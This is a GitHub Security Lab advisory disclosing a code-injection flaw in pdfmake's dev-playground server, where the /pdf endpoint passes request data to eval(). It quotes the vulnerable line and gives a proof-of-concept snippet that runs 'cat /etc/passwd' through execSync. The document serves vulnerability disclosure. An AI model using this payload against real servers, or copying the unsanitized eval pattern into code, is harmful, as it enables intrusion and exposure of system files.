
[skip to content](#content)

 /
[Security Lab](/ "Security Lab")
[Research](https://github.blog/tag/github-security-lab/ "Research")
[Advisories](/advisories/ "Advisories")
[CodeQL Wall of Fame](/codeql-wall-of-fame/ "CodeQL Wall of Fame")
Resources

[Events](/events/ "Events")

[Get Involved](/get-involved/)

* Resources
* [Open Source Community](/open-source "Home")
* [Enterprise](/enterprise "Home")

 /
[Security Lab](/ "Security Lab")

[Research](https://github.blog/tag/github-security-lab/ "Research")
[Advisories](/advisories/ "Advisories")
[CodeQL Wall of Fame](/codeql-wall-of-fame/ "CodeQL Wall of Fame")
Resources

[Open Source Community](/open-source "Open Source Community")
[Enterprise](/enterprise "Enterprise")

[Events](/events/ "Events")
[Get Involved](/get-involved/ "Events")

December 6, 2022
# GHSL-2022-068: Remote Code Execution (RCE) in PDFMake - CVE-2022-46161

[![Author avatar](https://avatars.githubusercontent.com/u/61799930)
GitHub Security Lab](https://github.com/ghsecuritylab)

## Coordinated Disclosure Timeline

* 2022-08-23: Report sent to liborm85 at gmail.com
* 2022-10-10: [Issue opened](https://github.com/bpampuch/pdfmake/issues/2487) asking for a security contact
* 2022-11-21: Deadline expired so publishing in accordance to the [GitHub Security Lab disclosure policy](https://securitylab.github.com/advisories/#policy)

## Summary

The dev-playground of pdfmake lacks sandboxing/sanitization of the data sent to the server (which flows to `eval()`).

## Product

pdfmake

## Tested Version

[0.2.5](https://github.com/bpampuch/pdfmake/releases/tag/0.2.5)

## Details

### Issue: RCE in `dev-playground.js` (`GHSL-2022-068`)

The [`/pdf` endpoint](https://github.com/bpampuch/pdfmake/blob/802813970ac6de68a0bd0931b74150b33da0dd18/dev-playground/server.js#L32) in charge of creating a PDF from a given JS code does not sanitize user-input, nor does the execution take place in a sandboxed environment.

```
app.post('/pdf', function (req, res) {
	eval(req.body.content);

```
#### Impact

This issue may lead to a variety of exploit primitives, including Remote Code Execution (RCE) or uncontrolled resource consumption.

#### Resources

* [CWE-94](https://cwe.mitre.org/data/definitions/94.html): Improper Control of Generation of Code (‘Code Injection’)
* [CWE-400](https://cwe.mitre.org/data/definitions/400.html): Uncontrolled Resource Consumption

##### POC

Providing the following snippet will cause pdfmake to dump the contents of `/etc/passwd` into the generated PDF doc:

```
const {execSync} = require('node:child_process');
var out = execSync('cat /etc/passwd');
dd = {
    content: [
        out.toString()
        ]
}

```
## CVE

* CVE-2022-46161

## Credit

This issue was discovered and reported by GHSL team member [@VulnerabilityViper (Ryan Finn)](https://github.com/VulnerabilityViper).

## Contact

You can contact the GHSL team at `securitylab@github.com`, please include a reference to `GHSL-2022-068` in any communication regarding this issue.

## Product

* [Features](https://github.com/features)
* [Security](https://github.com/security)
* [Team](https://github.com/team)
* [Enterprise](https://github.com/enterprise)
* [Customer stories](https://github.com/customer-stories?type=enterprise)
* [The ReadME Project](https://github.com/readme)
* [Pricing](https://github.com/pricing)
* [Resources](https://resources.github.com)
* [Roadmap](https://github.com/github/roadmap)
* [Compare GitHub](https://resources.github.com/devops/tools/compare/)

## Platform

* [Developer API](https://developer.github.com)
* [Partners](http://partner.github.com/)
* [Atom](https://atom.io)
* [Electron](http://electron.atom.io/)
* [GitHub Desktop](https://desktop.github.com/)

## Support

* [Docs](https://docs.github.com)
* [Community Forum](https://github.community)
* [Professional Services](https://services.github.com/)
* [GitHub Skills](https://skills.github.com/)
* [Status](https://githubstatus.com/)
* [Contact GitHub](https://support.github.com)

## Company

* [About](https://github.com/about)
* [Blog](https://github.blog)
* [Careers](https://github.com/about/careers)
* [Press](https://github.com/about/press)
* [Inclusion](https://github.com/about/careers)
* [Social Impact](https://github.com/about/press)
* [Shop](https://shop.github.com)

* GitHub Inc. ©
  2024
* [Terms](https://docs.github.com/en/github/site-policy/github-terms-of-service)
* [Privacy](https://docs.github.com/en/github/site-policy/github-privacy-statement)
* Sitemap
* [What is Git?](https://github.com/git-guides)
* Manage Cookies
* Do not share my personal information

